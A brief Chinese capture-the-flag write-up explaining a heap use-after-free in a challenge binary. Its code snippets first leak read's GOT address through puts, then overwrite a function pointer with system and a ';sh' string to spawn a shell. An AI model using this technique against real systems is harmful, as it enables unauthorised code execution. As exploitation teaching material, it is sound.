### 0x01 思路

`main`函数实现了`create,delete,show`三个功能

`delete`函数在`free`堆块的时候未将指针置零，因此存在`UAF`漏洞可以利用

```

#首先创建两个堆块 然后释放掉他们 这样fastbin 存在 chunk1 head -> chunk0 head
create(16,'AAAA') \# idx 0 -> chunk0
create(16,'BBBB') \# idx 1 -> chunk1
delete(0)
delete(1)
```

![](../Images/b51f4df7ec2855d952974700f6c0b5c7.png)

```

\# create一个和head相同大小size的堆块 将chunk1 head 和 chunk0 head重新申请回来 可以获得一个指针 我们将这个指针修改为puts 然后后面放上read\_got 就可以泄露read\_addr
create(8,p32(puts)+p32(read\_got)) \# idx 2 = idx 0 -> chunk0 head -> puts(read\_got)
```

![](../Images/4c2b690178fcb84a62e54f33ee7590bc.png)

```

\# 重复刚刚的操作 将指针指向system 即可getshell
delete(2)
create(8,p32(system\_addr) + ";sh\\x00") \# idx 3 = idx 0 -> chunk0 head -> system('sh')
```
